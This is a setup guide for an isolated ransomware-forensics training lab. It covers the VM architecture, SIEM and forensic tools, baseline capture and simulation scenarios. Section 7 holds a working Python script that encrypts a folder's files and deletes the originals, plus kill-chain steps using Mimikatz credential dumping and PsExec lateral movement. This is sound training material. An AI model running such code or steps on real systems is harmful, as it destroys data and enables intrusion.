# Simulated Lab Environment — Setup Guide

## 1. Architecture Overview

The lab is an **isolated, air-gapped virtual network** designed for safely simulating ransomware incidents and practicing forensic investigation without risk to production systems.

```
                         ┌─────────────────────────────┐
                         │    HOST MACHINE              │
                         │  (Hypervisor – VirtualBox)   │
                         └──────────┬──────────────────┘
                                    │
                    ┌───────────────┼───────────────┐
                    │     Internal-Only vSwitch      │
                    │        10.0.50.0/24             │
                    ├───────────────┬────────────────┤
                    │               │                │
           ┌────────▼──────┐  ┌────▼─────────┐  ┌──▼──────────────┐
           │ Windows Server │  │ Windows 10   │  │ Ubuntu (SIEM /  │
           │ 2019 (DC)      │  │ Endpoint     │  │ Forensic WS)    │
           │ 10.0.50.10     │  │ 10.0.50.20   │  │ 10.0.50.30      │
           └────────────────┘  └──────────────┘  └─────────────────┘
```

> **CRITICAL:** The virtual network must have **no route to the internet or host network**. Use a host-only or internal-only adapter.

---

## 2. Hardware Requirements

| Resource | Minimum | Recommended |
|---|---|---|
| CPU | 4 cores | 8+ cores |
| RAM | 16 GB | 32 GB |
| Storage | 200 GB SSD | 500 GB SSD |
| Network | Host-only adapter (no internet) | Same |

---

## 3. Hypervisor Setup

### Option A: VirtualBox (Free, Cross-Platform)

1. Download and install [Oracle VirtualBox](https://www.virtualbox.org/).
2. Create a **Host-Only Network**:
   - Go to **File → Host Network Manager → Create**.
   - Set adapter IP to `10.0.50.1/24`.
   - **Disable** the DHCP server (we will use static IPs).
3. All VMs will use this host-only adapter.

### Option B: VMware Workstation Pro / Proxmox

- VMware: Create a custom virtual network (vmnet) with no NAT and no host-to-network bridge.
- Proxmox: Create a Linux bridge with no physical interface attached.

---

## 4. Virtual Machines

### 4.1 Windows Server 2019 — Domain Controller

| Setting | Value |
|---|---|
| Hostname | `DC01` |
| IP | `10.0.50.10/24` |
| OS | Windows Server 2019 Evaluation |
| Role | Active Directory Domain Services, DNS, File Server |
| RAM | 4 GB |
| Disk | 60 GB |

**Post-Install Configuration:**

1. Promote to Domain Controller → domain: `forensiclab.local`
2. Create user accounts:
   - `Administrator` (domain admin)
   - `jsmith` (standard domain user — simulated victim)
   - `svc_backup` (service account with elevated privileges)
3. Create a shared folder `\\DC01\SharedDocs` with sample files (Word, Excel, PDF).
4. Enable **Windows Event Log** forwarding to the SIEM.
5. Enable **PowerShell Script Block Logging** (Event ID 4104).
6. Enable **Process Creation Auditing** (Event ID 4688) with command-line logging.

### 4.2 Windows 10 — Target Endpoint

| Setting | Value |
|---|---|
| Hostname | `WS01` |
| IP | `10.0.50.20/24` |
| OS | Windows 10 Enterprise Evaluation |
| Role | Simulated end-user workstation (victim) |
| RAM | 4 GB |
| Disk | 60 GB |

**Post-Install Configuration:**

1. Join to `forensiclab.local` domain.
2. Log in as `jsmith`.
3. Install common applications (Office, browser) to simulate a realistic environment.
4. Map the shared drive `\\DC01\SharedDocs`.
5. Populate the Desktop and Documents with sample files.
6. Enable Sysmon logging with the [SwiftOnSecurity Sysmon config](https://github.com/SwiftOnSecurity/sysmon-config).

### 4.3 Ubuntu 22.04 — SIEM & Forensic Workstation

| Setting | Value |
|---|---|
| Hostname | `FORENSIC01` |
| IP | `10.0.50.30/24` |
| OS | Ubuntu 22.04 LTS |
| Role | Centralized logging (SIEM), forensic analysis |
| RAM | 8 GB |
| Disk | 100 GB |

**Post-Install Configuration:**

#### SIEM Stack

```bash
# Install Wazuh (open-source SIEM/XDR)
curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh
sudo bash wazuh-install.sh -a
```

- Configure Windows agents on `DC01` and `WS01` to forward logs to `10.0.50.30`.

#### Forensic Tools

```bash
# Memory forensics
sudo apt install -y python3-pip
pip3 install volatility3

# Disk forensics
sudo apt install -y autopsy sleuthkit

# Network capture
sudo apt install -y wireshark tshark tcpdump

# Evidence imaging
# FTK Imager (download from Exterro — Linux CLI version)
# Alternatively:
sudo apt install -y dc3dd     # forensic dd variant

# Malware analysis
sudo apt install -y yara clamav

# Log analysis
pip3 install hayabusa          # Windows Event Log analyzer
# Or download from: https://github.com/Yamato-Security/hayabusa

# Artifact collection
# KAPE (Windows) — run from WS01/DC01
# Velociraptor — download from https://docs.velociraptor.app/
```

---

## 5. Network Configuration

| VM | IP Address | Gateway | DNS |
|---|---|---|---|
| DC01 | 10.0.50.10/24 | — | 127.0.0.1 |
| WS01 | 10.0.50.20/24 | 10.0.50.10 | 10.0.50.10 |
| FORENSIC01 | 10.0.50.30/24 | 10.0.50.10 | 10.0.50.10 |

**Firewall Rules on Host:**

- Block all traffic between the host-only network and the internet.
- Allow traffic only within `10.0.50.0/24`.

---

## 6. Pre-Attack Baseline

Before running any simulation, take the following baseline snapshots:

1. **VM Snapshots** — Create a clean snapshot of each VM labeled `BASELINE-CLEAN`.
2. **Baseline memory dump** — Capture RAM from `WS01` using WinPmem or DumpIt.
3. **Baseline disk hash** — Hash the VMDK/VDI files with SHA-256.
4. **Baseline log export** — Export current Windows Event Logs from `DC01` and `WS01`.
5. **Network baseline** — Run a short packet capture to document normal traffic patterns.

---

## 7. Ransomware Simulation Scenarios

> ⚠️ **WARNING:** Only use educational/simulated ransomware in a fully isolated environment. Never use real malware on production systems.

### Scenario 1: File Encryption Simulation (Custom Script)

A Python script that mimics ransomware behavior without actual malicious capability:

```python
# simulate_ransomware.py — FOR EDUCATIONAL USE ONLY
# Encrypts files in a target directory using Fernet (symmetric encryption)
import os
from cryptography.fernet import Fernet

TARGET_DIR = r"C:\Users\jsmith\Documents\SampleFiles"
KEY = Fernet.generate_key()
cipher = Fernet(KEY)

# Save key (simulates key exfiltration)
with open(r"C:\Users\jsmith\Desktop\DECRYPTION_KEY.txt", "w") as kf:
    kf.write(KEY.decode())

# Encrypt files
for root, dirs, files in os.walk(TARGET_DIR):
    for f in files:
        filepath = os.path.join(root, f)
        with open(filepath, "rb") as fh:
            data = fh.read()
        encrypted = cipher.encrypt(data)
        with open(filepath + ".locked", "wb") as fh:
            fh.write(encrypted)
        os.remove(filepath)

# Drop ransom note
with open(os.path.join(TARGET_DIR, "README_RANSOM.txt"), "w") as rn:
    rn.write("YOUR FILES HAVE BEEN ENCRYPTED. This is a simulation.")
```

### Scenario 2: Lateral Movement Simulation

1. From `WS01`, use `PsExec` to execute commands on `DC01` using `svc_backup` credentials.
2. Copy the encryption script to `DC01\SharedDocs`.
3. Execute from `DC01` to simulate spread.

### Scenario 3: Full Kill-Chain Simulation

1. **Initial Access** — Simulate phishing by manually executing a dropper script on `WS01`.
2. **Discovery** — Run `net view`, `nltest /dclist:`, `whoami /all` to simulate reconnaissance.
3. **Credential Harvesting** — Use Mimikatz (in the isolated lab only) to dump credentials.
4. **Lateral Movement** — Use PsExec to pivot to `DC01`.
5. **Encryption** — Run the encryption script on both machines.

---

## 8. Forensic Tooling Quick Reference

| Tool | Installed On | Purpose |
|---|---|---|
| Volatility 3 | FORENSIC01 | Memory analysis |
| Autopsy + TSK | FORENSIC01 | Disk forensics, timeline |
| Wireshark | FORENSIC01 | Network packet analysis |
| dc3dd | FORENSIC01 | Forensic disk imaging |
| YARA | FORENSIC01 | Malware signature matching |
| Hayabusa | FORENSIC01 | Windows Event Log analysis |
| WinPmem / DumpIt | WS01, DC01 | RAM acquisition |
| FTK Imager | WS01, DC01 | Disk / memory imaging |
| Sysmon | WS01 | Enhanced endpoint telemetry |
| KAPE | WS01, DC01 | Rapid artifact collection |
| Velociraptor | FORENSIC01 (server), endpoints (agents) | Endpoint monitoring & triage |
| Wazuh | FORENSIC01 | SIEM / centralized logging |
